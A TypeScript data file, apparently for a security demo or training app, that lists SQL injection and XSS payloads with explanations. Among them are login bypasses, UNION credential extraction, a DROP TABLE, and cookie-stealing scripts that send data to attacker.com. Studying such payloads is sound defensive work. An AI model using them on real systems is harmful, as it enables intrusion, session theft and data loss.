export interface AttackPayload {
  id: string;
  category: 'sqli' | 'xss';
  subCategory: string;
  name: string;
  payload: string;
  targetField: 'email' | 'feedback';
  engineOrContext?: string;
  description: string;
  practicalImpact: string;
  isDestructive?: boolean;
  isTimeDelay?: boolean;
  delaySeconds?: number;
  extractedTables?: string[];
}

export const ATTACK_PAYLOADS: AttackPayload[] = [
  // ==========================================
  // SQL INJECTION (SQLi)
  // ==========================================

  // 1. Authentication Bypass (Basic)
  {
    id: 'sqli_auth_1',
    category: 'sqli',
    subCategory: 'Authentication Bypass',
    name: "Tautology (' OR '1'='1)",
    payload: "' OR '1'='1",
    targetField: 'email',
    engineOrContext: 'Universal SQL',
    description: "Evaluates unescaped WHERE string comparison as always true, returning all table rows.",
    practicalImpact: "Bypasses login & dumps 100% of user records from the submissions table."
  },
  {
    id: 'sqli_auth_2',
    category: 'sqli',
    subCategory: 'Authentication Bypass',
    name: "Comment Out Query (' OR 1=1 --)",
    payload: "' OR 1=1 --",
    targetField: 'email',
    engineOrContext: 'MySQL / PostgreSQL / MSSQL',
    description: "Forces tautology and truncates the remainder of the server SQL query with a dash comment.",
    practicalImpact: "Neutralizes trailing WHERE conditions and outputs all registered user entries."
  },
  {
    id: 'sqli_auth_3',
    category: 'sqli',
    subCategory: 'Authentication Bypass',
    name: 'Double Quote Bypass (" OR ""=")',
    payload: '" OR ""="',
    targetField: 'email',
    engineOrContext: 'MySQL / SQLite',
    description: "Exploits string interpolation in queries that wrap inputs with double quotes.",
    practicalImpact: "Dumps database records when application uses double-quoted string parameters."
  },
  {
    id: 'sqli_auth_4',
    category: 'sqli',
    subCategory: 'Authentication Bypass',
    name: "Admin Impersonation (admin' --)",
    payload: "admin' --",
    targetField: 'email',
    engineOrContext: 'Universal SQL',
    description: "Targets the administrator record directly and discards password verification logic.",
    practicalImpact: "Authenticates as root administrator with elevated system privileges."
  },

  // 2. Union-Based (Extracting Data from Other Tables)
  {
    id: 'sqli_union_users',
    category: 'sqli',
    subCategory: 'Union-Based Extraction',
    name: "Union Extract Users & Hashes",
    payload: "' UNION SELECT 1, username, password FROM users --",
    targetField: 'email',
    engineOrContext: 'Relational DBs',
    description: "Combines original query with a secondary query targeting external tables to steal credentials.",
    practicalImpact: "Appends sensitive user credentials and password hashes directly into the application output.",
    extractedTables: ['users', 'auth_credentials', 'admin_hashes']
  },
  {
    id: 'sqli_union_schema',
    category: 'sqli',
    subCategory: 'Union-Based Extraction',
    name: "Schema Information Extraction",
    payload: "' UNION SELECT null, table_name FROM information_schema.tables --",
    targetField: 'email',
    engineOrContext: 'MySQL / PostgreSQL / MSSQL',
    description: "Queries database metadata catalogs to map out internal database structure and tables.",
    practicalImpact: "Exposes all database table names and system architecture to the attacker.",
    extractedTables: ['information_schema.tables', 'pg_catalog', 'sys.tables']
  },

  // 3. Time-Based Blind
  {
    id: 'sqli_time_mysql',
    category: 'sqli',
    subCategory: 'Time-Based Blind',
    name: "MySQL SLEEP Probe",
    payload: "' OR SLEEP(5) --",
    targetField: 'email',
    engineOrContext: 'MySQL Engine',
    description: "Forces backend database to halt thread execution for 5 seconds to infer vulnerable execution.",
    practicalImpact: "Attacker measures server response latency to verify SQL injection without direct output.",
    isTimeDelay: true,
    delaySeconds: 5
  },
  {
    id: 'sqli_time_mssql',
    category: 'sqli',
    subCategory: 'Time-Based Blind',
    name: "MSSQL WAITFOR DELAY",
    payload: "'; WAITFOR DELAY '0:0:5' --",
    targetField: 'email',
    engineOrContext: 'Microsoft SQL Server',
    description: "Instructs MSSQL query engine to sleep for 5 seconds before returning query result.",
    practicalImpact: "Exfiltrates database characters bit-by-bit through deliberate timing analysis.",
    isTimeDelay: true,
    delaySeconds: 5
  },
  {
    id: 'sqli_time_pg',
    category: 'sqli',
    subCategory: 'Time-Based Blind',
    name: "PostgreSQL pg_sleep",
    payload: "' OR pg_sleep(5) --",
    targetField: 'email',
    engineOrContext: 'PostgreSQL Engine',
    description: "Invokes PostgreSQL internal sleep procedure to measure round-trip response time.",
    practicalImpact: "Bypasses blind endpoints by confirming SQL query execution via controlled server delays.",
    isTimeDelay: true,
    delaySeconds: 5
  },

  // 4. Destructive Payload
  {
    id: 'sqli_drop_table',
    category: 'sqli',
    subCategory: 'Destructive Payload',
    name: "Table Drop ('; DROP TABLE users; --)",
    payload: "'; DROP TABLE users; --",
    targetField: 'email',
    engineOrContext: 'Stacked Queries',
    description: "Appends a secondary destructive DDL statement that permanently deletes the users table.",
    practicalImpact: "Catastrophic data loss and service outage if database allows multi-statement execution.",
    isDestructive: true
  },

  // ==========================================
  // CROSS-SITE SCRIPTING (XSS)
  // ==========================================

  // 1. Standard Script Tag
  {
    id: 'xss_script_basic',
    category: 'xss',
    subCategory: 'Standard Script Tag',
    name: "Basic Alert Box",
    payload: "<script>alert('XSS')</script>",
    targetField: 'feedback',
    engineOrContext: 'HTML Body / Stored Feed',
    description: "Direct JavaScript execution via classic <script> tags inside unescaped HTML templates.",
    practicalImpact: "Demonstrates immediate arbitrary client-side code execution in victim browser."
  },
  {
    id: 'xss_script_remote',
    category: 'xss',
    subCategory: 'Standard Script Tag',
    name: "Remote Script Exfiltration",
    payload: '<script src="http://attacker.com/steal.js"></script>',
    targetField: 'feedback',
    engineOrContext: 'Remote Script Loader',
    description: "Loads an external attacker-controlled JavaScript file into the victim's DOM context.",
    practicalImpact: "Deploys a keystroke logger, session stealer, or cryptominer without payload length limits."
  },

  // 2. Event Handlers
  {
    id: 'xss_event_img',
    category: 'xss',
    subCategory: 'Event Handlers (Filter Bypass)',
    name: "Broken Image Error Handler",
    payload: '<img src="invalid-image.jpg" onerror="alert(\'XSS\')">',
    targetField: 'feedback',
    engineOrContext: 'HTML Image Tag',
    description: "Forces a 404 image load error that instantly triggers the embedded onerror JavaScript event.",
    practicalImpact: "Bypasses naive WAF filters that only search for '<script>' strings."
  },
  {
    id: 'xss_event_svg',
    category: 'xss',
    subCategory: 'Event Handlers (Filter Bypass)',
    name: "SVG Vector OnLoad Handler",
    payload: '<svg onload="alert(\'XSS\')">',
    targetField: 'feedback',
    engineOrContext: 'Inline SVG Vector',
    description: "SVG elements execute their onload handlers immediately upon parser DOM insertion.",
    practicalImpact: "Executes without waiting for user interaction or broken media downloads."
  },
  {
    id: 'xss_event_body',
    category: 'xss',
    subCategory: 'Event Handlers (Filter Bypass)',
    name: "Body Tag OnLoad Execution",
    payload: '<body onload="alert(\'XSS\')">',
    targetField: 'feedback',
    engineOrContext: 'Document Body Tag',
    description: "Appends an onload trigger to the document body element during template interpolation.",
    practicalImpact: "Fires immediately as page rendering completes."
  },

  // 3. Attribute Breakout
  {
    id: 'xss_attr_onfocus',
    category: 'xss',
    subCategory: 'Attribute Breakout',
    name: "Input Attribute OnFocus Breakout",
    payload: '" onfocus="alert(\'XSS\')',
    targetField: 'feedback',
    engineOrContext: 'Inside value="..." attribute',
    description: "Breaks out of an HTML attribute using a leading quotation mark and injects an event handler.",
    practicalImpact: "Fires whenever victim clicks or focuses the input field."
  },
  {
    id: 'xss_attr_cookie_steal',
    category: 'xss',
    subCategory: 'Attribute Breakout',
    name: "Tag Breakout & Cookie Exfiltration",
    payload: '"><script>document.location=\'http://attacker.com/cookie?c=\'+document.cookie</script>',
    targetField: 'feedback',
    engineOrContext: 'Attribute & Tag Breakout',
    description: "Closes the hosting attribute and tag, then redirects the victim to transmit active session cookies.",
    practicalImpact: "Full session hijacking: attacker receives session cookie on remote endpoint."
  },

  // 4. JavaScript Pseudo-Protocol
  {
    id: 'xss_pseudo_href',
    category: 'xss',
    subCategory: 'JavaScript Pseudo-Protocol',
    name: "Hyperlink Pseudo-Protocol",
    payload: '<a href="javascript:alert(\'XSS\')">Click here</a>',
    targetField: 'feedback',
    engineOrContext: 'Anchor href attribute',
    description: "Injects JavaScript scheme into link destination attributes without requiring script tags.",
    practicalImpact: "Executes attacker payload when victim clicks the seemingly normal link."
  },

  // 5. Obfuscated / Filter-Bypass
  {
    id: 'xss_obfuscated_base64',
    category: 'xss',
    subCategory: 'Obfuscated & Filter Bypass',
    name: "Base64 Encoded Eval Bypass",
    payload: "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
    targetField: 'feedback',
    engineOrContext: 'Base64 Obfuscation',
    description: "Encodes malicious payload in Base64 ('YWxlcnQoJ1hTUycp' = alert('XSS')) to evade keyword filters.",
    practicalImpact: "Bypasses signature-based Web Application Firewalls (WAF) that detect raw 'alert' or 'cookie'."
  }
];
